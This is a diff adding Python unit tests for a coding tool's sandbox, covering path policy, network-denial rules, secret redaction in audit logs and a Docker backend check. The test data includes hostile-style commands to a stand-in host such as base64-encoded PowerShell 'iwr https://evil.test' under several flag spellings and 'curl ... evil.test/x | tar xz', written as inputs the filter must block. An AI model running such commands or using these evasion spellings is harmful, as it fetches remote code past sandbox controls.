@@ -146,6 +146,14 @@ class PathPolicyTests(SandboxTestBase):
         tools.write(str(target), "explicit\n")
         self.assertEqual(target.read_text(encoding="utf-8"), "explicit\n")
 
+    def test_is_allowed_resolves_a_relative_path_against_the_workspace(self) -> None:
+        # Resolving against the process CWD graded a file the search never
+        # touched, so a workspace result outside the repo was filtered away.
+        tools = self._tools()
+        tools.write("notes.txt", "hello\n")
+        self.assertTrue(tools.sandbox.is_allowed(Path("notes.txt")))
+        self.assertFalse(tools.sandbox.is_allowed(Path(".env")))
+
     def test_sensitive_paths_are_blocked_unless_enabled(self) -> None:
         (self.workspace / ".env").write_text("TOKEN=1\n", encoding="utf-8")
         (self.workspace / "key.pem").write_text("pem\n", encoding="utf-8")
@@ -309,13 +317,53 @@ class NetworkPolicyTests(SandboxTestBase):
 
         policy = self._tools().sandbox.policy
         encoded = base64.b64encode("iwr https://evil.test".encode("utf-16-le")).decode()
-        self.assertIsNotNone(
-            policy.network_denial(f"powershell -EncodedCommand {encoded}")
-        )
+        # pwsh resolves any prefix of `-EncodedCommand` and also accepts the
+        # `-ec` initialism; the raw base64 must be decoded for each spelling.
+        for flag in ("-EncodedCommand", "-encoded", "-enc", "-en", "-e", "-ec"):
+            with self.subTest(flag=flag):
+                self.assertIsNotNone(
+                    policy.network_denial(f"powershell {flag} {encoded}"), flag
+                )
         # Undecodable encoded commands are opaque and must fail closed.
         self.assertIsNotNone(
             policy.network_denial("powershell -EncodedCommand not-base64!")
         )
+        self.assertIsNotNone(policy.network_denial("pwsh -ec not-base64!"))
+
+    def test_inline_command_keeps_its_head_when_arguments_follow(self) -> None:
+        # Slicing the inline command to the end of the segment kept the opening
+        # quote, so `-Command "iwr ..." x` reduced to the host instead of `iwr`.
+        policy = self._tools().sandbox.policy
+        for command in (
+            'pwsh -Command "iwr http://evil.test" x',
+            'bash -c "curl -sSL https://evil.test/x | tar xz" arg0',
+            'sh -c "wget http://evil.test" ignored',
+        ):
+            with self.subTest(command=command):
+                self.assertIsNotNone(policy.network_denial(command), command)
+
+    def test_inline_command_text_is_not_itself_a_command_head(self) -> None:
+        # The quoted string used to be appended as a head, so `./curl` inside an
+        # ordinary inline command was refused as a call to curl.
+        policy = self._tools().sandbox.policy
+        for command in (
+            'bash -c "rm -f ./curl"',
+            'sh -c "mv a /tmp/nc"',
+            'bash -c "cat /usr/bin/wget"',
+        ):
+            with self.subTest(command=command):
+                self.assertIsNone(policy.network_denial(command), command)
+
+    def test_package_runners_and_windows_script_names_are_network_use(self) -> None:
+        policy = self._tools().sandbox.policy
+        for command in (
+            "npx create-react-app app",
+            "bunx cowsay hi",
+            "curl.cmd https://evil.test",
+            "wget.ps1 https://evil.test",
+        ):
+            with self.subTest(command=command):
+                self.assertIsNotNone(policy.network_denial(command), command)
 
     def test_cmd_caret_escapes_are_analyzed(self) -> None:
         policy = self._tools().sandbox.policy
@@ -379,6 +427,19 @@ class NetworkPolicyTests(SandboxTestBase):
         target = audit.denials()[-1].target
         self.assertNotIn("SEKRET123", target)
         self.assertNotIn("hunter2", target)
+
+        # URL userinfo and `net use /user:` put the secret outside any option.
+        for command, secret in (
+            ("curl https://alice:hunter2@internal.test/api", "hunter2"),
+            ("net use \\\\srv\\share /user:bob hunter2", "hunter2"),
+        ):
+            audit.deny("shell", command, "network denied")
+            target = audit.denials()[-1].target
+            self.assertNotIn(secret, target, command)
+            self.assertIn("<redacted>", target, command)
+        # An ordinary URL keeps its port and path.
+        audit.deny("shell", "curl http://127.0.0.1:8080/v1/models", "denied")
+        self.assertIn("127.0.0.1:8080/v1/models", audit.denials()[-1].target)
 
     def test_sensitive_file_variants_are_blocked(self) -> None:
         from minimalcode.sandbox.sensitive import is_sensitive_path
@@ -616,6 +677,26 @@ class BackendTests(SandboxTestBase):
                 wrapped[wrapped.index("--user") + 1], f"{os.getuid()}:{os.getgid()}"
             )
         self.assertIn("none", wrapped)
+
+    def test_docker_wrap_refuses_a_non_posix_shell(self) -> None:
+        # The command string is executed by `/bin/sh` inside the container, so a
+        # PowerShell command would be silently mis-parsed instead of refused.
+        from minimalcode.sandbox import SandboxUnavailable
+
+        policy = SandboxPolicy.from_settings(
+            self._settings(backend="docker"), self.workspace
+        )
+        request = CommandRequest(
+            argv=("pwsh", "-Command", "Get-ChildItem"),
+            command="Get-ChildItem",
+            shell_kind="pwsh7",
+            shell_label="PowerShell 7",
+            cwd=self.workspace,
+            temp_dir=None,
+            policy=policy,
+        )
+        with self.assertRaisesRegex(SandboxUnavailable, "POSIX shell"):
+            DockerBackend().wrap(request)
 
 
 class SearchLeakTests(SandboxTestBase):
